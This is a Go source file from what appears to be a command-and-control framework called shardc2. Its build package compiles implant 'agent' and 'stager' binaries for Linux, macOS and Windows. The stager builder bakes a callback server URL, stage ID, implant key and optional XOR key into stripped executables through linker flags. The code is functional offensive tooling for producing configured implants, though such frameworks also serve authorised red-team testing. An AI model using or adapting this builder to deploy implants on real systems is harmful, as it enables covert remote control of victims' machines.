package builds

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/shardc2/shardc2/pkg/models"
)

type Request struct {
	GOOS                  string `json:"goos"`
	GOARCH                string `json:"goarch"`
	Profile               string `json:"profile"`
	PayloadKeyFingerprint string `json:"payload_key_fingerprint,omitempty"`
	RequestedBy           string `json:"requested_by,omitempty"`
}

func (r Request) Validate() error {
	if !models.AllowedGOOS[r.GOOS] {
		return fmt.Errorf("unsupported GOOS %q (allowed: linux, darwin, windows)", r.GOOS)
	}
	if !models.AllowedGOARCH[r.GOARCH] {
		return fmt.Errorf("unsupported GOARCH %q (allowed: amd64, arm64, arm)", r.GOARCH)
	}
	if r.Profile == "" {
		return fmt.Errorf("profile is required")
	}
	return nil
}

type Artifact struct {
	Path   string
	Status string
	Error  string
}

type Builder interface {
	Build(ctx context.Context, req Request) (Artifact, error)
}

type LocalBuilder struct {
	repoRoot string
}

func NewLocalBuilder(repoRoot string) *LocalBuilder {
	return &LocalBuilder{repoRoot: repoRoot}
}

func (b *LocalBuilder) Build(ctx context.Context, req Request) (Artifact, error) {
	if err := req.Validate(); err != nil {
		return Artifact{Status: models.BuildStatusFailed, Error: err.Error()}, err
	}

	outDir := filepath.Join(b.repoRoot, "bin", "builds")
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return Artifact{Status: models.BuildStatusFailed, Error: err.Error()}, fmt.Errorf("create build dir: %w", err)
	}

	suffix := ""
	if req.GOOS == "windows" {
		suffix = ".exe"
	}
	outName := fmt.Sprintf("shardc2-agent-%s-%s-%d%s", req.GOOS, req.GOARCH, time.Now().UnixMilli(), suffix)
	outPath := filepath.Join(outDir, outName)

	cmd := exec.CommandContext(ctx, "go", "build", "-ldflags", "-s -w", "-o", outPath, "./cmd/agent")
	cmd.Dir = b.repoRoot
	cmd.Env = append(os.Environ(), "GOOS="+req.GOOS, "GOARCH="+req.GOARCH, "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		errMsg := fmt.Sprintf("build failed: %s: %v", string(output), err)
		return Artifact{Status: models.BuildStatusFailed, Error: errMsg}, fmt.Errorf("%s", errMsg)
	}

	return Artifact{Path: outPath, Status: models.BuildStatusCompleted}, nil
}

type StagerRequest struct {
	GOOS       string `json:"goos"`
	GOARCH     string `json:"goarch"`
	StageID    string `json:"stage_id"`
	ServerURL  string `json:"server_url"`
	ImplantKey string `json:"implant_key"`
	XORKey     string `json:"xor_key"`
}

func (r StagerRequest) Validate() error {
	if !models.AllowedGOOS[r.GOOS] {
		return fmt.Errorf("unsupported GOOS %q", r.GOOS)
	}
	if !models.AllowedGOARCH[r.GOARCH] {
		return fmt.Errorf("unsupported GOARCH %q", r.GOARCH)
	}
	if r.StageID == "" {
		return fmt.Errorf("stage_id is required")
	}
	if r.ServerURL == "" {
		return fmt.Errorf("server_url is required")
	}
	return nil
}

func (b *LocalBuilder) BuildStager(ctx context.Context, req StagerRequest) (Artifact, error) {
	if err := req.Validate(); err != nil {
		return Artifact{Status: models.BuildStatusFailed, Error: err.Error()}, err
	}

	outDir := filepath.Join(b.repoRoot, "bin", "builds")
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return Artifact{Status: models.BuildStatusFailed, Error: err.Error()}, fmt.Errorf("create build dir: %w", err)
	}

	suffix := ""
	if req.GOOS == "windows" {
		suffix = ".exe"
	}
	outName := fmt.Sprintf("shardc2-stager-%s-%s-%d%s", req.GOOS, req.GOARCH, time.Now().UnixMilli(), suffix)
	outPath := filepath.Join(outDir, outName)

	ldflags := fmt.Sprintf("-s -w -X main.buildServerURL=%s -X main.buildStageID=%s -X main.buildImplantKey=%s",
		req.ServerURL, req.StageID, req.ImplantKey)
	if req.XORKey != "" {
		ldflags += " -X main.buildXORKey=" + req.XORKey
	}

	cmd := exec.CommandContext(ctx, "go", "build", "-ldflags", ldflags, "-o", outPath, "./cmd/stager")
	cmd.Dir = b.repoRoot
	cmd.Env = append(os.Environ(), "GOOS="+req.GOOS, "GOARCH="+req.GOARCH, "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		errMsg := fmt.Sprintf("stager build failed: %s: %v", string(output), err)
		return Artifact{Status: models.BuildStatusFailed, Error: errMsg}, fmt.Errorf("%s", errMsg)
	}

	return Artifact{Path: outPath, Status: models.BuildStatusCompleted}, nil
}
